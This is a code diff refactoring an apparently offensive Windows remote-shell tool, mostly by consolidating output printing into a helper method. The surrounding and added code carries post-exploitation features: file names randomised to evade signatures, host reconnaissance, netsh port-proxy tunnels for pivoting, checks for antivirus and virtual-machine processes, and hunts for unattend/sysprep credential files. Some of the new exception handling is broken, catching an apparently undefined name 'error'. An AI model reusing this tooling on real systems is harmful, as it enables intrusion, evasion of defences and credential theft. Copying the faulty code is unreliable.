@@ -22,7 +22,7 @@ def random_sig():
 
     Return: random file name to avoid signatures, or at least limit signature exposure
     """
-    rand_length = random.randint(1,60)
+    rand_length = random.randint(3,60)
     if rand_length % 2 == 0:
         return ''.join(random.choices(string.ascii_lowercase + string.digits, k=rand_length))
     else:
@@ -78,6 +78,14 @@ class RemoteShell(cmd.Cmd):
         # If the user wants to just execute a command without cmd.exe, set raw command and set no output
         if self.__silentCommand is True:
             self.__shell = ''
+
+
+    def format_print_buff(self):
+        if len(self.__outputBuffer.strip('\r\n')) > 0:
+        #print(self.__outputBuffer.strip('\r\n'))
+        #self.__outputBuffer = ''
+            print(self.__outputBuffer)
+            self.__outputBuffer = ''
 
     def do_shell(self, s):
         os.system(s)
@@ -196,32 +204,20 @@ class RemoteShell(cmd.Cmd):
         try:
             logging.info("Target")
             self.execute_remote('whoami')
-            if len(self.__outputBuffer.strip('\r\n')) > 0:
-                print(self.__outputBuffer)
-                self.__outputBuffer = '' 
+            self.format_print_buff()
+
             logging.info("Hostname")
             self.execute_remote('hostname')
-            if len(self.__outputBuffer.strip('\r\n')) > 0:
-                print(self.__outputBuffer)
-                self.__outputBuffer = ''
+            self.format_print_buff()
+
             logging.info("Arch: ")
             self.execute_remote('SET Processor | findstr /i "PROCESSOR_ARCHITECTURE"')
-            if len(self.__outputBuffer.strip('\r\n')) > 0:
-                print(self.__outputBuffer)
-                self.__outputBuffer = '' 
-            logging.info("IP Addresses: ") 
+            self.format_print_buff()
+
+            logging.info("IP Addresses: ")
             self.execute_remote('ipconfig /all | findstr /i "(Preferred)"')
-            if len(self.__outputBuffer.strip('\r\n')) > 0:
-                print(self.__outputBuffer)
-                self.__outputBuffer = ''
-            logging.info('Last Reboot')
-            if self.__shell_type == 'powershell':
-                self.execute_remote('gci -h C:\pagefile.sys')
-            else:
-                self.execute_remote('dir /a C:\pagefile.sys | findstr /R "4[0-9]"')
-            if len(self.__outputBuffer.strip('\r\n')) > 0:                
-                print(self.__outputBuffer)
-                self.__outputBuffer = ''
+            self.format_print_buff()
+
         except:
             pass
 
@@ -260,50 +256,40 @@ class RemoteShell(cmd.Cmd):
         rport = s.split(" ")[2]
         try:
             self.execute_remote("netsh interface portproxy add v4tov4 listenport=%s connectport=%s connectaddress=%s" % (lport, rport, rhost))
-            if len(self.__outputBuffer.strip('\r\n')) > 0:
-                print(self.__outputBuffer)
-                self.__outputBuffer = '' 
-        except:
-            pass
+            self.format_print_buff()
+        except error as e:
+            print("[!] Something went wrong, see below for error:\n", e)
 
     def do_showtun(self, s):
         try:
             self.execute_remote("netsh interface portproxy show v4tov4")
-            if len(self.__outputBuffer.strip('\r\n')) > 0:
-                print(self.__outputBuffer)
-                self.__outputBuffer = '' 
-        except:
-            pass
+            self.format_print_buff()
+        except error as e:
+            print("[!] Something went wrong, see below for error:\n", e)
 
     def do_deltun(self, s):
         lport = s.split(" ")[0] 
         try:
             self.execute_remote("netsh interface portproxy delete v4tov4 listenport=%s" % (lport))
-            if len(self.__outputBuffer.strip('\r\n')) > 0:
-                print(self.__outputBuffer)
-                self.__outputBuffer = '' 
-        except:
-            pass
+            self.format_print_buff()
+        except error as e:
+            print("[!] Something went wrong, see below for error:\n", e)
     
     def do_ls(self, s):
         #see if user specified a dir or not
         if len(s) == 0:
             try:
                 self.execute_remote('dir -h .')
-                if len(self.__outputBuffer.strip('\r\n')) > 0:
-                    print(self.__outputBuffer)
-                    self.__outputBuffer = '' 
-            except:
-                pass
+                self.format_print_buff()
+            except error as e:
+                print("[!] Something went wrong, see below for error:\n", e)
         else:
             path = s.split(" ")[0]
             try:
-                self.execute_remote('dir -h %s' % (path))
-                if len(self.__outputBuffer.strip('\r\n')) > 0:
-                    print(self.__outputBuffer)
-                    self.__outputBuffer = '' 
-            except:
-                pass
+                self.execute_remote('dir -h %s' % path)
+                self.format_print_buff()
+            except error as e:
+                print("[!] Something went wrong, see below for error:\n", e)
 
     
     # add progress bar, see how ivan does his
@@ -336,12 +322,9 @@ class RemoteShell(cmd.Cmd):
     def do_av(self, s):
         try:
             self.execute_remote('tasklist /svc | findstr /i "MsMpEng.exe || WinDefend || MSASCui.exe || navapsvc.exe || avkwctl.exe || fsav32.exe || mcshield.exe || ntrtscan.exe || avguard.exe || ashServ.exe || avengine.exe || avgemc.exe || tmntsrv.exe || kavfswp.exe || kavtray.exe || vapm.exe || avpui.exe || avp.exe"')
-            if len(self.__outputBuffer.strip('\r\n')) > 0:
-                buff = self.__outputBuffer
-                cprint(buff, "red")
-                self.__outputBuffer = ''
-        except:
-            pass
+            self.format_print_buff()
+        except error as e:
+            print("[!] Something went wrong, see below for error:\n", e)
 
 
     # fix this output 
@@ -408,9 +391,7 @@ class RemoteShell(cmd.Cmd):
             logging.info("Common Processes: ")
             self.execute_remote('tasklist /svc | findstr /i "vmtoolsd.exe VBoxTray.exe"')
             if len(self.__outputBuffer.strip('\r\n')) > 0:
-                buff = self.__outputBuffer
-                cprint(buff, "red")
-                self.__outputBuffer = ''
+                self.format_print_buff()
             else:
                 logging.info("No VM Processes found")
 
@@ -422,9 +403,7 @@ class RemoteShell(cmd.Cmd):
                 self.__outputBuffer = ''
                 cprint('C:\Program Files\VMWare found', "red")
             self.execute_remote('systeminfo | findstr /i "Manufacturer:"')
-            if len(self.__outputBuffer.strip('\r\n')) > 0: 
-                print(self.__outputBuffer)
-                self.__outputBuffer = ''
+            self.format_print_buff()
             logging.info("Virtual Box Detection")
             self.execute_remote("dir /B C:\Windows\System32\drivers\VBoxMouse.sys")
             self.execute_remote("dir /B C:\Windows\System32\drivers\VBoxGuest.sys")
@@ -435,16 +414,13 @@ class RemoteShell(cmd.Cmd):
                 print(self.__outputBuffer.strip('\r\n'))
             self.__outputBuffer = ''
 
-
-        except:
-            logging.info("Something went wrong, try again")
+        except error as e:
+            print("[!] Something went wrong, see below for error:\n", e)
 
     def do_cat(self, s):
         try:
             self.execute_remote('type ' + s)
-            if len(self.__outputBuffer.strip('\r\n')) > 0: 
-                print(self.__outputBuffer)
-                self.__outputBuffer = ''
+            self.format_print_buff()
         except:
             logging.critical(str(e))
             pass
@@ -467,64 +443,60 @@ class RemoteShell(cmd.Cmd):
             logging.info("Looking for: %s, %s" % (one, two))
             self.execute_remote('dir C:\ | findstr /i "unattend.txt || unattend.inf"')
             if len(self.__outputBuffer.strip('\r\n')) > 0:
-                print(self.__outputBuffer)
-                self.__outputBuffer = ''
+                self.format_print_buff()
             else:
                 print("Nothing Found")
-        except:
-            pass
+        except error as e:
+            print("[!] Something went wrong, see below for error:\n", e)
 
         try:
             logging.info("Looking for: %s" % (three))
             self.execute_remote("dir C:\Windows | findstr /i 'sysprep.inf'")
             if len(self.__outputBuffer.strip('\r\n')) > 0:
-                print(self.__outputBuffer)
-                self.__outputBuffer = '' 
+                self.format_print_buff()
             else:
                 print("Nothing Found")
-        except:
-            pass
+        except error as e:
+            print("[!] Something went wrong, see below for error:\n", e)
 
         try:
             logging.info("Looking for: %s, %s" % (four, five))
             self.execute_remote(r'dir C:\Windows\sysprep | findstr /i "sysprep.inf || sysprep.xml"')
             if len(self.__outputBuffer.strip('\r\n')) > 0:
-                print(self.__outputBuffer)
-                self.__outputBuffer = ''
+                self.format_print_buff()
             else:
                 print("Nothing Found")
-        except:
-            pass
+        except error as e:
+            print("[!] Something went wrong, see below for error:\n", e)
         try:
             logging.info("Looking for: %s, %s" % (six, seven))
             self.execute_remote(r'dir C:\Windows\Panther | findstr /i "Unattended.xml || Unattend.xml"')
             if len(self.__outputBuffer.strip('\r\n')) > 0:
-                print(self.__outputBuffer)
-                self.__outputBuffer = ''
+                self.format_print_buff()
             else:
                 print("Nothing Found")
-        except:
-            pass
+        except error as e:
+            print("[!] Something went wrong, see below for error:\n", e)
+
         try:
             logging.info("Looking for: %s, %s" % (eight, nine))
             self.execute_remote(r'dir C:\Windows\Panther\Unattend | findstr /i "Unattended.xml || Unattend.xml"')
             if len(self.__outputBuffer.strip('\r\n')) > 0:
-                print(self.__outputBuffer)
-                self.__outputBuffer = ''
+                self.format_print_buff()
             else:
                 print("Nothing Found")
-        except:
-            pass
+        except error as e:
+            print("[!] Something went wrong, see below for error:\n", e)
+
         try:
             logging.info("Looking for: %s, %s" % (ten, eleven))
             self.execute_remote('dir C:\Windows\System32\Sysprep | findstr /i "unattend.xml || unattended.xml"')
             if len(self.__outputBuffer.strip('\r\n')) > 0:
-                print(self.__outputBuffer)
-                self.__outputBuffer = ''
+                self.format_print_buff()
             else:
                 print("Nothing Found")
-        except:
-            pass
+        except error as e:
+            print("[!] Something went wrong, see below for error:\n", e)
 
     def do_regrip(self, s):
         try:
